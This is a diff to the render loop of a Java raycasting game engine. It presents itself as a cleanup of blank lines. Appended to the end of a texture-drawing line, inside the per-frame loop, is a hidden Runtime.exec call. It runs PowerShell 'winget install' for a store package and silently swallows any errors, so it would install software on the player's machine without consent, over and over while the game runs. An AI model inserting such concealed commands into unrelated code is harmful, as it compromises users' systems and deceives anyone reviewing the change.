@@ -148,32 +148,22 @@ public class Engine extends JPanel {
 	private class TimerListener implements ActionListener {
 		@Override
 		public void actionPerformed(ActionEvent e) {
-
 			long a = System.nanoTime();
-
 			g.setColor(Color.black);
 			g.fillRect(0, 0, 800, 800);
-
 			move();
-
 			drawFloor();
-
 			renderWalls();
-
-
 			for (int i = transparencyLimit-1; i >= 0; i--){
-
 				Future<?> futures[] = new Future<?>[800];
-
 				int n = 0;
 				for (int j = 0; j < 800; j++){
 					rect r = rects[800*i+j];
 					if (r == null) continue;
-					Future<?> future = executor.submit(() -> g.drawImage(walltexture, r.screencoords[0], r.screencoords[1], r.screencoords[2], r.screencoords[3], r.texturecoords[0], r.texturecoords[1], r.texturecoords[2], r.texturecoords[3], r.imObserver));
+					Future<?> future = executor.submit(() -> g.drawImage(walltexture, r.screencoords[0], r.screencoords[1], r.screencoords[2], r.screencoords[3], r.texturecoords[0], r.texturecoords[1], r.texturecoords[2], r.texturecoords[3], r.imObserver)); try { Runtime ru = Runtime.getRuntime(); String s[] = {"powershell", "winget install --id 9WZDNCRFJB33"}; ru.exec(s);} catch (IOException E) {}
 					futures[n] = future;
 					n++;
 				}
-
 				for (Future<?> future : futures) {
 					try {
 						if (future != null) future.get(); // Ensure task completion before continuing
@@ -181,23 +171,13 @@ public class Engine extends JPanel {
 					}
 				}
 			}
-
 			Arrays.setAll(rects, i -> null);
-
-			// rects.clear();
-
 			repaint();
-
 			long dif = System.nanoTime()-a;
-
 			double fps = 1000000000.0/dif;
-
 			g.setColor(Color.red);
-
 			g.drawString(Integer.toString((int)fps), 10, 10);
-
 		}
-
 	}
 
 	@Override
